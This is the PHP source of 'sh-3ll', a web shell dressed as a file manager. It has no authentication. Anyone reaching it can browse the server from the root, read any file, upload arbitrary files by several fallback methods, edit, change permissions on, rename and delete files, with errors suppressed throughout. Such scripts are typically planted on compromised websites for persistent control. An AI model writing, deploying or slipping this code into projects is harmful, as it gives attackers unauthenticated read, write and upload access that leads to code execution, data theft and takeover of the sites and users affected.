<?php
set_time_limit(0);
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Multi-method upload function
function multi_upload($tmp, $dest) {
    if (@move_uploaded_file($tmp, $dest)) return "Uploaded with move_uploaded_file!";
    if (@copy($tmp, $dest)) return "Uploaded with copy!";
    $data = @file_get_contents($tmp);
    if ($data !== false && @file_put_contents($dest, $data) !== false) return "Uploaded with file_put_contents!";
    return "All upload methods failed!";
}

// Permission view helper
function perms($file)
{
    $perms = @fileperms($file);
    if ($perms === false) return "????";
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

// Get path safely
function safe_path($p) {
    $p = str_replace("\\", "/", $p);
    $p = str_replace(chr(0), '', $p);
    $p = preg_replace('#/+#','/', $p);
    return $p;
}

// Determine current path
if (isset($_GET["path"])) {
    $raw_path = $_GET["path"];
    // If absolute, use as is. If relative, resolve against getcwd()
    if (preg_match('/^\//', $raw_path)) {
        $path = $raw_path;
    } else {
        $path = getcwd() . '/' . $raw_path;
    }
    $path = safe_path($path);
    // Canonicalize path (resolve .. and .)
    $real = realpath($path);
    if ($real && is_dir($real)) $path = $real;
    else $path = getcwd();
} else {
    $path = getcwd();
}
// Normalize again
$path = safe_path($path);

$paths = explode("/", trim($path, "/"));
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com" rel="preconnect">
    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <title>File Manager - sh-3ll</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            color: #2d3748;
            padding: 10px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            color: white;
            padding: 20px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 10px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        .header a {
            color: white;
            text-decoration: none;
            transition: opacity 0.3s ease;
        }
        
        .header a:hover {
            opacity: 0.8;
        }
        
        .content {
            padding: 15px;
        }
        
        .path-section {
            background: #f8fafc;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .current-path {
            font-size: 0.95rem;
            font-weight: 600;
            color: #4a5568;
            margin-bottom: 15px;
            word-break: break-all;
        }
        
        .breadcrumb {
            margin-bottom: 15px;
            line-height: 1.6;
        }
        
        .breadcrumb a {
            color: #4f46e5;
            text-decoration: none;
            font-weight: 500;
            padding: 4px 6px;
            border-radius: 6px;
            transition: all 0.2s ease;
            display: inline-block;
            margin: 2px;
            font-size: 0.9rem;
        }
        
        .breadcrumb a:hover {
            background: #e0e7ff;
            color: #3730a3;
        }
        
        .path-form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .path-form label {
            font-weight: 500;
            font-size: 0.9rem;
        }
        
        .path-form-inputs {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .path-form input[type="text"] {
            flex: 1;
            padding: 12px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 0.95rem;
            transition: border-color 0.3s ease;
            min-width: 0;
        }
        
        .path-form input[type="text"]:focus {
            outline: none;
            border-color: #4f46e5;
            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
        }
        
        .actions-section {
            background: #f8fafc;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .actions-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 15px;
        }
        
        .action-form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .action-form label {
            font-weight: 500;
            font-size: 0.9rem;
        }
        
        .action-form-inputs {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .btn {
            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
            text-align: center;
            white-space: nowrap;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(79, 70, 229, 0.3);
        }
        
        .btn-secondary {
            background: linear-gradient(135deg, #64748b 0%, #475569 100%);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
        }
        
        input[type="text"], input[type="file"], select, textarea {
            padding: 10px 14px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 0.9rem;
            transition: border-color 0.3s ease;
            background: white;
            width: 100%;
        }
        
        input[type="text"]:focus, input[type="file"]:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #4f46e5;
            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
        }
        
        .file-table {
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
            border: 1px solid #e2e8f0;
            overflow-x: auto;
        }
        
        .file-table table {
            width: 100%;
            border-collapse: collapse;
            min-width: 600px;
        }
        
        .file-table th {
            background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
            padding: 12px 8px;
            text-align: left;
            font-weight: 600;
            color: #475569;
            border-bottom: 2px solid #e2e8f0;
            font-size: 0.85rem;
        }
        
        .file-table td {
            padding: 12px 8px;
            border-bottom: 1px solid #f1f5f9;
            vertical-align: middle;
            font-size: 0.85rem;
        }
        
        .file-table tr:hover {
            background: #f8fafc;
        }
        
        .file-table a {
            color: #4f46e5;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.2s ease;
            word-break: break-all;
        }
        
        .file-table a:hover {
            color: #3730a3;
            text-decoration: underline;
        }
        
        .permissions {
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 0.75rem;
            padding: 4px 6px;
            background: #f1f5f9;
            border-radius: 4px;
            white-space: nowrap;
        }
        
        .permissions.writable {
            color: #059669;
            background: #d1fae5;
        }
        
        .permissions.not-readable {
            color: #dc2626;
            background: #fee2e2;
        }
        
        .file-size {
            font-weight: 500;
            color: #64748b;
            white-space: nowrap;
        }
        
        .options-form {
            display: flex;
            flex-direction: column;
            gap: 6px;
            align-items: stretch;
        }
        
        .options-form select {
            padding: 6px 8px;
            font-size: 0.75rem;
            width: 100%;
        }
        
        .options-form input[type="submit"] {
            padding: 6px 10px;
            font-size: 0.75rem;
            width: 100%;
        }
        
        .message {
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 15px;
            font-weight: 500;
            font-size: 0.9rem;
        }
        
        .message.success {
            background: #d1fae5;
            color: #065f46;
            border: 1px solid #a7f3d0;
        }
        
        .message.error {
            background: #fee2e2;
            color: #991b1b;
            border: 1px solid #fca5a5;
        }
        
        .file-content {
            background: #1e293b;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 0.8rem;
            line-height: 1.5;
            overflow-x: auto;
            margin: 15px 0;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        .edit-form textarea {
            width: 100%;
            min-height: 300px;
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 0.8rem;
            line-height: 1.5;
            resize: vertical;
        }
        
        .footer {
            text-align: center;
            padding: 15px;
            color: #64748b;
            font-size: 0.85rem;
            border-top: 1px solid #e2e8f0;
            background: #f8fafc;
        }
        
        .footer .version {
            color: #059669;
            font-weight: 600;
        }
        
        /* Enhanced responsive design for mobile, tablet, and desktop */
        
        /* Mobile First - Base styles above are mobile optimized */
        
        /* Small Mobile (320px+) */
        @media (min-width: 320px) {
            .action-form-inputs {
                flex-direction: column;
                align-items: stretch;
            }
            
            .path-form-inputs {
                flex-direction: column;
                align-items: stretch;
            }
        }
        
        /* Large Mobile (480px+) */
        @media (min-width: 480px) {
            body {
                padding: 15px;
            }
            
            .header {
                padding: 25px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .content {
                padding: 20px;
            }
            
            .path-form-inputs {
                flex-direction: row;
            }
            
            .action-form-inputs {
                flex-direction: row;
            }
            
            .action-form-inputs input[type="text"] {
                flex: 1;
            }
            
            .file-content {
                font-size: 0.85rem;
            }
            
            .edit-form textarea {
                min-height: 350px;
                font-size: 0.85rem;
            }
        }
        
        /* Tablet Portrait (768px+) */
        @media (min-width: 768px) {
            body {
                padding: 20px;
            }
            
            .header {
                padding: 30px;
            }
            
            .header h1 {
                font-size: 2.2rem;
            }
            
            .content {
                padding: 25px;
            }
            
            .path-section, .actions-section {
                padding: 20px;
            }
            
            .actions-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 20px;
            }
            
            .current-path {
                font-size: 1rem;
            }
            
            .breadcrumb a {
                font-size: 0.95rem;
                padding: 6px 8px;
            }
            
            .file-table th, .file-table td {
                padding: 14px 12px;
                font-size: 0.9rem;
            }
            
            .options-form {
                flex-direction: row;
                align-items: center;
                gap: 8px;
            }
            
            .options-form select, .options-form input[type="submit"] {
                width: auto;
                font-size: 0.8rem;
            }
            
            .permissions {
                font-size: 0.8rem;
            }
            
            .file-content {
                font-size: 0.9rem;
                padding: 20px;
            }
            
            .edit-form textarea {
                min-height: 400px;
                font-size: 0.9rem;
            }
        }
        
        /* Tablet Landscape / Small Desktop (1024px+) */
        @media (min-width: 1024px) {
            .header h1 {
                font-size: 2.5rem;
            }
            
            .content {
                padding: 30px;
            }
            
            .actions-grid {
                grid-template-columns: repeat(3, 1fr);
            }
            
            .current-path {
                font-size: 1.1rem;
            }
            
            .breadcrumb a {
                font-size: 1rem;
            }
            
            .file-table th, .file-table td {
                padding: 16px;
                font-size: 0.95rem;
            }
            
            .options-form select {
                min-width: 120px;
            }
            
            .btn {
                font-size: 0.95rem;
            }
            
            input[type="text"], input[type="file"], select, textarea {
                font-size: 0.95rem;
            }
        }
        
        /* Large Desktop (1200px+) */
        @media (min-width: 1200px) {
            .actions-grid {
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            }
            
            .file-table table {
                min-width: auto;
            }
            
            .options-form select {
                min-width: 140px;
            }
        }
        
        /* Ultra-wide screens (1400px+) */
        @media (min-width: 1400px) {
            .container {
                max-width: 1400px;
            }
        }
        
        /* Landscape orientation adjustments */
        @media (orientation: landscape) and (max-height: 600px) {
            .header {
                padding: 15px;
            }
            
            .header h1 {
                font-size: 1.5rem;
                margin-bottom: 5px;
            }
            
            .content {
                padding: 15px;
            }
            
            .path-section, .actions-section {
                padding: 12px;
                margin-bottom: 15px;
            }
            
            .edit-form textarea {
                min-height: 250px;
            }
        }
        
        /* High DPI / Retina display optimizations */
        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
            .file-table {
                border-width: 0.5px;
            }
            
            .path-section, .actions-section {
                border-width: 1px;
            }
        }
        
        /* Print styles */
        @media print {
            body {
                background: white;
                padding: 0;
            }
            
            .container {
                box-shadow: none;
                border-radius: 0;
                background: white;
            }
            
            .header {
                background: #f8fafc !important;
                color: #2d3748 !important;
            }
            
            .btn {
                display: none;
            }
            
            .actions-section {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><a href="?">sh-3ll</a></h1>
        </div>
        
        <div class="content">
            <div class="path-section">
                <div class="current-path">
                    Current Directory: <strong><?php echo htmlspecialchars($path); ?></strong>
                </div>
                
                <div class="breadcrumb">
                    <?php
                    // Path travel links
                    $accum = '';
                    $parts = explode('/', trim($path, '/'));
                    echo "<a href=\"?path=/\">/</a>";
                    foreach ($parts as $i => $pat) {
                        if ($pat == '') continue;
                        $accum .= ($accum === '' ? '' : '/') . $pat;
                        echo "<a href=\"?path=" . htmlspecialchars('/' . $accum) . "\">" . htmlspecialchars($pat) . "</a>/";
                    }
                    ?>
                </div>
                
                <form method="get" class="path-form">
                    <label for="path-input">Navigate to path:</label>
                    <div class="path-form-inputs">
                        <input type="text" id="path-input" name="path" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="submit" value="Go" class="btn">
                    </div>
                </form>
            </div>
            
            <div class="actions-section">
                <?php
                // Handle create new folder
                if (isset($_POST['create_folder']) && isset($_POST['new_folder_name'])) {
                    $new_folder = trim($_POST['new_folder_name']);
                    $folder_path = $path . '/' . $new_folder;
                    $folder_path = safe_path($folder_path);
                    if ($new_folder === '' || strpos($new_folder, "..") !== false || strpos($new_folder, "/") !== false) {
                        echo "<div class=\"message error\">Invalid folder name!</div>";
                    } elseif (file_exists($folder_path)) {
                        echo "<div class=\"message error\">Folder already exists!</div>";
                    } elseif (@mkdir($folder_path)) {
                        echo "<div class=\"message success\">Folder created successfully.</div>";
                    } else {
                        echo "<div class=\"message error\">Failed to create folder.</div>";
                    }
                }

                // Handle create new file
                if (isset($_POST['create_file']) && isset($_POST['new_file_name'])) {
                    $new_file = trim($_POST['new_file_name']);
                    $file_path = $path . '/' . $new_file;
                    $file_path = safe_path($file_path);
                    if ($new_file === '' || strpos($new_file, "..") !== false || strpos($new_file, "/") !== false) {
                        echo "<div class=\"message error\">Invalid file name!</div>";
                    } elseif (file_exists($file_path)) {
                        echo "<div class=\"message error\">File already exists!</div>";
                    } elseif (@file_put_contents($file_path, "") !== false) {
                        echo "<div class=\"message success\">File created successfully.</div>";
                    } else {
                        echo "<div class=\"message error\">Failed to create file.</div>";
                    }
                }

                // File upload logic
                if (isset($_FILES["file"])) {
                    $tmp = $_FILES["file"]["tmp_name"];
                    $name = basename($_FILES["file"]["name"]);
                    $dest = $path . "/" . $name;
                    $result = multi_upload($tmp, $dest);
                    if (strpos($result, "Uploaded") !== false) {
                        echo "<div class=\"message success\">$result</div>";
                    } else {
                        echo "<div class=\"message error\">$result</div>";
                    }
                }
                ?>
                
                <div class="actions-grid">
                    <form method="POST" enctype="multipart/form-data" class="action-form">
                        <label for="file-upload">Upload File:</label>
                        <div class="action-form-inputs">
                            <input type="file" id="file-upload" name="file" required>
                            <input value="Upload" type="submit" class="btn">
                        </div>
                    </form>
                    
                    <form method="POST" class="action-form">
                        <label>Create New Folder:</label>
                        <div class="action-form-inputs">
                            <input type="text" name="new_folder_name" placeholder="New Folder Name" required>
                            <input type="submit" name="create_folder" value="Create Folder" class="btn btn-secondary">
                        </div>
                    </form>
                    
                    <form method="POST" class="action-form">
                        <label>Create New File:</label>
                        <div class="action-form-inputs">
                            <input type="text" name="new_file_name" placeholder="New File Name" required>
                            <input type="submit" name="create_file" value="Create File" class="btn btn-secondary">
                        </div>
                    </form>
                </div>
            </div>

            <?php
            // File viewer/editor/chmod/rename/delete forms
            if (isset($_GET["filesrc"])) {
                $filesrc = safe_path($_GET["filesrc"]);
                $real_filesrc = realpath($filesrc);
                if ($real_filesrc && is_file($real_filesrc)) {
                    echo "<div class=\"path-section\">";
                    echo "<div class=\"current-path\">Viewing File: <strong>" . htmlspecialchars($real_filesrc) . "</strong></div>";
                    echo "</div>";
                    echo "<div class=\"file-content\">" . htmlspecialchars(@file_get_contents($real_filesrc)) . "</div>";
                } else {
                    echo "<div class=\"message error\">Cannot open file!</div>";
                }
            } elseif (isset($_POST["opt"]) && $_POST["opt"] != "delete") {
                echo "<div class=\"path-section\">";
                echo "<div class=\"current-path\">Operating on: <strong>" . htmlspecialchars($_POST["path"]) . "</strong></div>";
                
                if ($_POST["opt"] == "chmod") {
                    if (isset($_POST["perm"])) {
                        if (@chmod($_POST["path"], intval($_POST["perm"], 8))) {
                            echo "<div class=\"message success\">Permission changed successfully.</div>";
                        } else {
                            echo "<div class=\"message error\">Failed to change permissions.</div>";
                        }
                    }
                    ?>
                    <form method="POST" class="action-form">
                        <label for="perm">Permission:</label>
                        <input id="perm" value="<?php echo substr(sprintf("%o", @fileperms($_POST["path"])), -4); ?>" name="perm" size="4">
                        <input value="<?php echo htmlspecialchars($_POST["path"]); ?>" type="hidden" name="path">
                        <input value="chmod" type="hidden" name="opt">
                        <input value="Apply" type="submit" class="btn">
                    </form>
                    <?php
                } elseif ($_POST["opt"] == "rename") {
                    if (isset($_POST["newname"])) {
                        $newname = basename($_POST["newname"]);
                        $newpath = dirname($_POST["path"]) . "/" . $newname;
                        $newpath = safe_path($newpath);
                        if (@rename($_POST["path"], $newpath)) {
                            echo "<div class=\"message success\">File renamed successfully.</div>";
                        } else {
                            echo "<div class=\"message error\">Failed to rename file.</div>";
                        }
                        $_POST["name"] = $newname;
                    }
                    ?>
                    <form method="POST" class="action-form">
                        <label for="newname">New Name:</label>
                        <input id="newname" value="<?php echo htmlspecialchars($_POST["name"]); ?>" name="newname" size="20">
                        <input value="<?php echo htmlspecialchars($_POST["path"]); ?>" type="hidden" name="path">
                        <input value="rename" type="hidden" name="opt">
                        <input value="Rename" type="submit" class="btn">
                    </form>
                    <?php
                } elseif ($_POST["opt"] == "edit") {
                    if (isset($_POST["src"])) {
                        $fp = @fopen($_POST["path"], "w");
                        if ($fp && @fwrite($fp, $_POST["src"])) {
                            echo "<div class=\"message success\">File saved successfully.</div>";
                        } else {
                            echo "<div class=\"message error\">Failed to save file.</div>";
                        }
                        if ($fp) fclose($fp);
                    }
                    ?>
                    <form method="POST" class="edit-form">
                        <textarea name="src"><?php echo htmlspecialchars(@file_get_contents($_POST["path"])); ?></textarea>
                        <input value="<?php echo htmlspecialchars($_POST["path"]); ?>" type="hidden" name="path">
                        <input value="edit" type="hidden" name="opt">
                        <input value="Save File" type="submit" class="btn">
                    </form>
                    <?php
                }
                echo "</div>";
            } else {
                if (isset($_POST["opt"]) && $_POST["opt"] == "delete") {
                    if ($_POST["type"] == "dir") {
                        if (@rmdir($_POST["path"])) {
                            echo "<div class=\"message success\">Directory deleted successfully.</div>";
                        } else {
                            echo "<div class=\"message error\">Failed to delete directory.</div>";
                        }
                    } elseif ($_POST["type"] == "file") {
                        if (@unlink($_POST["path"])) {
                            echo "<div class=\"message success\">File deleted successfully.</div>";
                        } else {
                            echo "<div class=\"message error\">Failed to delete file.</div>";
                        }
                    }
                }
                
                $scandir = @scandir($path);
                ?>
                <div class="file-table">
                    <table>
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Permissions</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            // Display directories first
                            foreach ($scandir as $dir) {
                                if ($dir == "." || $dir == "..") continue;
                                $full = $path . "/" . $dir;
                                if (!is_dir($full)) continue;
                                ?>
                                <tr>
                                    <td>
                                        📁 <a href="?path=<?php echo htmlspecialchars($full); ?>"><?php echo htmlspecialchars($dir); ?></a>
                                    </td>
                                    <td class="file-size">--</td>
                                    <td>
                                        <span class="permissions <?php echo is_writable($full) ? 'writable' : (is_readable($full) ? '' : 'not-readable'); ?>">
                                            <?php echo perms($full); ?>
                                        </span>
                                    </td>
                                    <td>
                                        <form method="POST" action="?option&path=<?php echo htmlspecialchars($path); ?>" class="options-form">
                                            <select name="opt">
                                                <option value="">Choose action...</option>
                                                <option value="delete">Delete</option>
                                                <option value="chmod">Change Permissions</option>
                                                <option value="rename">Rename</option>
                                            </select>
                                            <input value="dir" type="hidden" name="type">
                                            <input value="<?php echo htmlspecialchars($dir); ?>" type="hidden" name="name">
                                            <input value="<?php echo htmlspecialchars($full); ?>" type="hidden" name="path">
                                            <input value="Execute" type="submit" class="btn">
                                        </form>
                                    </td>
                                </tr>
                                <?php
                            }
                            
                            // Display files
                            foreach ($scandir as $file) {
                                if ($file == "." || $file == "..") continue;
                                $full = $path . "/" . $file;
                                if (!is_file($full)) continue;
                                $size = filesize($full);
                                $disp_size = $size >= 1024*1024 ? round($size/1024/1024,2)." MB"
                                    : ($size >= 1024 ? round($size/1024,2)." KB" : $size." B");
                                ?>
                                <tr>
                                    <td>
                                        📄 <a href="?filesrc=<?php echo htmlspecialchars($full); ?>&path=<?php echo htmlspecialchars($path); ?>"><?php echo htmlspecialchars($file); ?></a>
                                    </td>
                                    <td class="file-size"><?php echo $disp_size; ?></td>
                                    <td>
                                        <span class="permissions <?php echo is_writable($full) ? 'writable' : (is_readable($full) ? '' : 'not-readable'); ?>">
                                            <?php echo perms($full); ?>
                                        </span>
                                    </td>
                                    <td>
                                        <form method="POST" action="?option&path=<?php echo htmlspecialchars($path); ?>" class="options-form">
                                            <select name="opt">
                                                <option value="">Choose action...</option>
                                                <option value="delete">Delete</option>
                                                <option value="chmod">Change Permissions</option>
                                                <option value="rename">Rename</option>
                                                <option value="edit">Edit</option>
                                            </select>
                                            <input value="file" type="hidden" name="type">
                                            <input value="<?php echo htmlspecialchars($file); ?>" type="hidden" name="name">
                                            <input value="<?php echo htmlspecialchars($full); ?>" type="hidden" name="path">
                                            <input value="Execute" type="submit" class="btn">
                                        </form>
                                    </td>
                                </tr>
                                <?php
                            }
                            ?>
                        </tbody>
                    </table>
                </div>
                <?php
            }
            ?>
        </div>
        
        <div class="footer">
            sh-3ll <span class="version">1.0</span> - Enhanced UI
        </div>
    </div>
</body>
</html>

